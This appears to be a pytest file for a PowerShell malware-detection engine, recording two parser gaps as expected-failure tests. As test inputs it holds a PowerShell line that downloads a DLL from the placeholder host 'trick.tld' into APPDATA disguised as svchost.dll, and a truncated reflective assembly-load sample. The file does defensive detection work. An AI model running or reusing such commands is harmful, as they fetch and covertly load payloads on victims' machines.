"""RC5 · Phase 9.5d · Parser coverage gaps documented as regression tests.

Every sample the corpus exposes as a semantic gap gets a dedicated
regression test here so:

  1. The gap is DOCUMENTED (via `xfail` marker with a clear reason),
     which prevents accidental re-introduction of the same bug once
     the fix ships.
  2. Any accidental fix can be caught by removing the `xfail` marker
     and watching the test start passing.
  3. The Golden Corpus stays green (100%) while the roadmap of
     post-cutover coverage items is machine-tracked.

Currently tracked gaps (all charter-blocked during shadow-run):

  * `$env:APPDATA + '\\...'` — `$env:VAR` scope reference used inside
    an expression concatenation currently hangs the deterministic
    PowerShell tokenizer. Tokens for `$env:` followed by a literal-string
    concat aren't consumed correctly. Fix requires parser work → post-cutover.
  * `[Reflection.Assembly]::Load([Convert]::FromBase64String(...))` —
    reflective PE loading in memory should emit a ReflectionNode /
    T1620 (Reflective Code Loading) mapping. Not implemented.

If any of these tests starts passing spontaneously, remove the `xfail`
marker and update the corpus expectation to Malicious.
"""
from __future__ import annotations

import signal

import pytest


@pytest.mark.xfail(
    strict=True,
    reason="Parser hangs on `$env:VAR + '...'` in expression context. "
           "Coverage gap tracked for post-cutover; see GC-275 in "
           "golden_corpus_expansion_r2.py which simplifies the sample.",
)
def test_env_var_expression_concat_parses_within_2s():
    """This test proves the parser hang. It's `xfail` on purpose — the
    day the parser fix ships, this test will START PASSING, at which
    point the strict `xfail` marker will FAIL the build, forcing us
    to update the corpus expectation for GC-275 back to its original
    variant with `$env:APPDATA` concatenation.
    """
    from engine.parsers.powershell_parser import PowerShellParser

    src = (
        r"$w = New-Object System.Net.WebClient; "
        r"$w.DownloadFile('http://trick.tld/x.dll', $env:APPDATA + '\svchost.dll')"
    )

    def _timeout_handler(sig, frame):
        raise TimeoutError("parser hung (> 2s)")

    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(2)
    try:
        sir = PowerShellParser().parse(src)
        # If we get here, the parser did NOT hang — either the gap has
        # been fixed OR the parser fast-failed. Sanity-check that at
        # least one statement was produced.
        assert len(sir.root.children) >= 1
    finally:
        signal.alarm(0)


@pytest.mark.xfail(
    strict=True,
    reason="[Reflection.Assembly]::Load(...) does not emit a "
           "ReflectionNode / T1620 mapping — new detection rule blocked "
           "by shadow-run charter. Tracked for post-cutover.",
)
def test_reflection_assembly_load_emits_suspicious_verdict():
    """Ensures a reflective PE-load sample rates at least Suspicious
    once T1620 mapping ships.
    """
    from engine.parsers.powershell_parser import PowerShellParser
    from engine.interpreters.powershell_interpreter import PowerShellInterpreter
    from engine.detectors.behavior_extractor import extract_behaviors
    from engine.detectors.mitre_mapper import map_behaviors_to_mitre
    from engine.detectors.verdict_v2 import compute_verdict

    src = (
        r'[Reflection.Assembly]::Load([Convert]::FromBase64String'
        r'("TVqQAAMAAAAEAAAA...ABCDE"))'
    )
    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
    b = extract_behaviors(g)
    m = map_behaviors_to_mitre(b)
    v = compute_verdict(b, m, [])
    assert v.verdict.value in ("Suspicious", "Malicious", "Critical")
